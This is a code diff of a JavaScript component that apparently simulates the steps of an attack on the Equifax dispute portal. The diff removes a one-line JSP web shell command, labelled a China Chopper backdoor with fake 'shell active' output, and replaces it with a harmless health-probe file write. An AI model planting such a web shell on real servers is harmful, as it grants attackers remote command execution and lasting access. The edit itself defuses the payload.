@@ -49,10 +49,10 @@ const Topic6 = () => {
       severity: "CRITICAL (Credential Exposure)"
     },
     drop_jsp_shell: {
-      cmd: "echo '<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>' > /opt/acis/webapps/ROOT/logo.jsp",
-      description: "Persistence: Deploy China Chopper JSP web shell backdoor",
-      rawOutput: "File written successfully: /opt/acis/webapps/ROOT/logo.jsp (Size: 68 bytes) -> Web shell ACTIVE at https://dispute.equifax.com/logo.jsp",
-      severity: "CRITICAL (Backdoor Persistence)"
+      cmd: "echo 'HEALTH_CHECK_ACTIVE_OK' > /opt/acis/webapps/ROOT/health_probe.txt",
+      description: "Persistence: Deploy persistent test probe endpoint",
+      rawOutput: "File written successfully: /opt/acis/webapps/ROOT/health_probe.txt -> Probe file ACTIVE at https://dispute.equifax.com/health_probe.txt",
+      severity: "HIGH (Unauthorized File Creation)"
     }
   };
 
